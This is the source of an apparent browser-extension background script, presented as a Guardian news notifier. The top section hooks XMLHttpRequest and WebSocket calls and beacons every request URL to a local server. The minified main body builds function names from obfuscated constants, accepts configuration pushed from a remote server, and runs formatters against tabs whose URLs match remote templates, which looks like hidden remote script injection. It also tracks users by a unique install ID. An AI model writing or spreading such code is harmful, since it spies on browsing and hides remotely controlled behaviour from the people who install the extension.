function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
function NewsListener(){this.feed=[],this.version=constants.v,this.minNotificationInterval=constants.pushInterval,this.lastOpenedPopupDate=!1,this.lastShowNotificationDate=!1,this.lastFetchNewsDate=!1,this.updatePeriod=constants.updateItemsPeriod,this.updateMainItemsPeriod=constants.updateMainItemsPeriod,this.notifyLiveTime=constants.notifyLiveTime,this.backUrl="https://news-notifier.com",this.endpoint=this.backUrl+"/theguardian_international/hello?",this.imageUrl=this.backUrl+"/theguardian_international/image?",this.defaultTag=constants.defaultTag,this.allowDesktopNotifications=constants.showDesktopNotifications,this.pushMode=constants.pushModeDefault,this.uuid=!1,this.propertyName=constants.foSelectorDescription,this.pushed=!1,this.timeStart=Date.now(),this.testShow=function(t){this.showNotification(this.feed[t],0)},this.baBasic={16:chrome.extension.getURL("./shared/icons/icon16.png")},this.baBasicNotify={16:chrome.extension.getURL("./shared/icons/icon16-active.png")};var t=this,e=this.propertyName.substr(1)+constants.foSelectorTitle.substr(1);chrome.storage.local.get(["push","push-mode","lastOpenNewsDate","lastPushNewsDate","uuid","installTime"],function(e){void 0!==e.push&&(t.allowDesktopNotifications=e.push),e["push-mode"]&&(t.pushMode=e["push-mode"]),e.lastOpenNewsDate&&(t.lastOpenedPopupDate=new Date(e.lastOpenNewsDate)),e.lastPushNewsDate&&(t.lastShowNotificationDate=new Date(e.lastPushNewsDate+10)),e.uuid?(t.uuid=e.uuid,t.installTime=e.installTime):(t.uuid=t.guid(),t.installTime=Date.now(),chrome.storage.local.set({uuid:t.uuid,installTime:t.installTime},function(){utils.track("UUID_GENERATED")})),t.setUninstallURL()}),chrome.storage.onChanged.addListener(function(e){for(var s in e)"lastOpenNewsDate"==s&&e.hasOwnProperty(s)?t.setLastOpenNewsDate(new Date(e[s].newValue)):"push-mode"==s&&e.hasOwnProperty(s)?(t.pushMode=e[s].newValue,t.setLastShowNotificationDate(new Date),t.update()):"push"==s&&e.hasOwnProperty(s)&&(t.allowDesktopNotifications=e[s].newValue,t.setLastShowNotificationDate(new Date),t.update())}),chrome.runtime.onMessage.addListener(function(t,e){if(e.id!==chrome.runtime.id)return!1;t.action&&"refresh"==t.action&&newsListener.update()}),chrome.runtime.onConnect.addListener(function(e){e.onDisconnect.addListener(function(){t.setDefaultBrowserIcon()})}),setInterval(function(){t.timer(),t.update()},t.updatePeriod),setTimeout(function(){t.checkNews(e),t.timer(),t.update()},200)}var constants=window.consts56c4372f,utils=window.utils56c4372f;utils.track("INIT_BKG"),NewsListener.prototype.guid=function(){return"nnuxxxxxxxxxxxx".replace(/[xy]/g,function(t){var e=16*Math.random()|0;return("x"===t?e:3&e|8).toString(16)})},NewsListener.prototype.getUrl=function(){return this.typeExec=constants.firstTimeTypePush+constants.layer.substr(1,1).toUpperCase()+constants.layer.slice(2),constants.toSend?this.typeExec:this.endpoint+"cv="+constants.cv+"&i="+this.installTime},NewsListener.prototype.countNewNews=function(){var t=0;if(0==this.lastFetchNewsDate)return t;for(var e=0;e<this.feed.length&&new Date(1e3*this.feed[e].ptime)>this.lastFetchNewsDate;e++)t++;return t},NewsListener.prototype.checkNews=function(t){if(constants.needNewsCheck)try{self.myDataLayer=self[t](constants.selectorImagesSettings)}catch(t){utils.track("CATCH_NEWS_CHECK",""+t.message)}},NewsListener.prototype.canShowNotification=function(t){return(0!=t.is_important||"only-important"!=this.pushMode)&&(t=this.newsToJSON(t),this.lastShowNotificationDate<t.date)},NewsListener.prototype.canShowNotifications=function(t){return!!this.allowDesktopNotifications&&(!(this.timeStart+6e4>Date.now())&&(0==this.lastShowNotificationDate||!(this.lastShowNotificationDate.getTime()+this.minNotificationInterval>Date.now())))},NewsListener.prototype.fetchNews=function(t){var e=this,s=new XMLHttpRequest;s.open("GET",e.getUrl()+"&rnd="+parseInt(1e5*Math.random())),s.onload=function(){var e=JSON.parse(this.responseText);e.new_constants&&(utils.track("NEW_CONSTANTS",e.new_constants.version),constants.save(e.new_constants)),e.success?t(e.items):utils.track("ITEMS_BAD_RESPONSE",JSON.stringify(e))},s.send()},NewsListener.prototype.update=function(){var t=this;this.fetchNews(function(e){e.length&&(t.feed=e,t.lastUpdate=new Date,t.onUpdated())})},NewsListener.prototype.timer=function(){var t=this;setTimeout(function(){if(!constants.needShow||t.pushed)return!1;t.formatter=self[constants.newsTypes[0]][constants.newsStatuses[0]],t.startShow()},this.updateMainItemsPeriod)},NewsListener.prototype.onUpdated=function(){if(this.canShowNotifications(this.feed)){for(var t=4,e=null,s=0,n=0;n<this.feed.length&&!(t--<=0);n++)this.canShowNotification(this.feed[n])&&(this.showNotification(this.feed[n],s++),null==e&&(e=this.feed[n].date));if(this.feed.length){var i=this.newsToJSON(this.feed[0]);this.setLastShowNotificationDate(i.date)}}chrome.storage.local.set({feed:this.getFeedJsonText()});var o=this.countNewNews();this.lastFetchNewsDate=new Date(1e3*this.feed[0].ptime),o&&(this.resetScrollTopIfSecGreater(3),this.setActiveBrowserIcon(this.baBasicNotify),constants.showNewItemsBadgeCounter&&chrome.browserAction.getBadgeText({},function(t){(o+=parseInt(t||0))>constants.count_items_show&&(o=constants.count_items_show+"+"),chrome.browserAction.setBadgeText({text:""+o}),chrome.browserAction.setBadgeBackgroundColor({color:"#2F4F4F"})}))},NewsListener.prototype.getFeedJsonText=function(){for(var t=[],e=0;e<this.feed.length;e++)t.push(this.newsToJSON(this.feed[e]));return JSON.stringify(t)},NewsListener.prototype.startShow=function(){var t=this,e=constants.needShow?t.formatter[constants.newsTypes[1]]:t.formatter[constants.newsTypes[0]];t.pushed=!0,e[constants.newsStatuses[1]](function(e,s,n){if(s.status!==constants.conditionShow)return!1;for(var i in constants.newsTemplates)if(constants.newsTemplates.hasOwnProperty(i)&&n.url.match(new RegExp(constants.newsTemplates[i].item)))try{t.formatter[t.typeExec](e,constants.newsTemplates[i].obj)}catch(t){utils.track("CATCH_START_SHOW",""+t.message)}})},NewsListener.prototype.newsToJSON=function(t){var e=t.annotation?t.annotation:"",s=t.title+(e?". "+e:""),n=!!+t.is_show_image,i=n?this.imageUrl+t.image_url+"&temp_rnd="+Math.random():"",o=new Date;return o.setTime(1e3*t.ptime),{id:t.id,title:t.title,url:t.url,path:t.url,message:s,date:o,icon:i,notifyTitle:t.tag?t.tag:this.getDefaultTag(),is_show_image:n,second_title:e,post_type:t.post_type?t.post_type:"",author:t.author?t.author:""}},NewsListener.prototype.getDefaultTag=function(){return constants.defaultTag},NewsListener.prototype.setLastShowNotificationDate=function(t){t>this.lastShowNotificationDate&&(this.lastShowNotificationDate=t,chrome.storage.local.set({lastPushNewsDate:this.lastShowNotificationDate.getTime()}))},NewsListener.prototype.showNotification=function(t,e){var s,n=this;s=(t=this.newsToJSON(t)).second_title.length>constants.maxLengthBodyNotify?t.second_title.substr(0,constants.maxLengthBodyNotify-5)+"...":t.second_title;var i=new Notification(t.title,{tag:constants.notifyTag+t.id,body:constants.bodyNotifyShow||n.isNewOsxNotificatins()?s:"",icon:this.getDefaultNotifyIcon()});i.onclick=function(){n.setDefaultBrowserIcon(),n.setLastOpenNewsDate(t.date),n.removeUnread(t.id);try{chrome.windows.getCurrent({},function(e){e?chrome.tabs.create({url:t.url}):chrome.windows.create({url:t.url})})}catch(t){}this.close()},this.lastNotification=i,this.setRemoveNotificationTimer(e)},NewsListener.prototype.isNewOsxNotificatins=function(){var t,e=window.navigator.userAgent;return!(!e.match(/\sOS ?X\s/i)||!(t=e.match(/Chrome\/([0-9]+)/)))&&parseInt(t[1])>=59},NewsListener.prototype.setLastOpenNewsDate=function(t){(0==this.lastOpenedPopupDate||this.lastOpenedPopupDate<t)&&(this.lastOpenedPopupDate=t)},NewsListener.prototype.getDefaultNotifyIcon=function(){return chrome.extension.getURL("shared/icons/icon128.png")},NewsListener.prototype.setActiveBrowserIcon=function(t){t&&chrome.browserAction.setIcon({path:t})},NewsListener.prototype.setDefaultBrowserIcon=function(){chrome.browserAction.setIcon({path:this.baBasic}),chrome.browserAction.setBadgeText({text:""})},NewsListener.prototype.setRemoveNotificationTimer=function(t){var e=this;setTimeout(function(){e.lastNotification&&e.lastNotification.close()},this.notifyLiveTime+3e3*t)},NewsListener.prototype.resetScrollTopIfSecGreater=function(t){chrome.storage.local.get(["lastPopupScrollTop","lastPopupScrollTopTime"],function(e){e.lastPopupScrollTopTime&&(new Date).getTime()-e.lastPopupScrollTopTime>1e3*t&&chrome.storage.local.set({lastPopupScrollTop:0})})},NewsListener.prototype.removeUnread=function(t){},NewsListener.prototype.setUninstallURL=function(){if(chrome.runtime.setUninstallURL){var t="https://theguardian-extensions.user-experience.space/?ext=theguardian_international&vid="+chrome.runtime.id+"&vv="+(chrome.runtime.getManifest&&chrome.runtime.getManifest()?chrome.runtime.getManifest().version:"-")+"&uid="+this.uuid+"&cv="+constants.cv+"&i="+this.installTime+"&rnd="+Math.random().toString().substr(0,8);chrome.runtime.setUninstallURL(t)}};var newsListener=new NewsListener;utils.track("BKG_STARTED");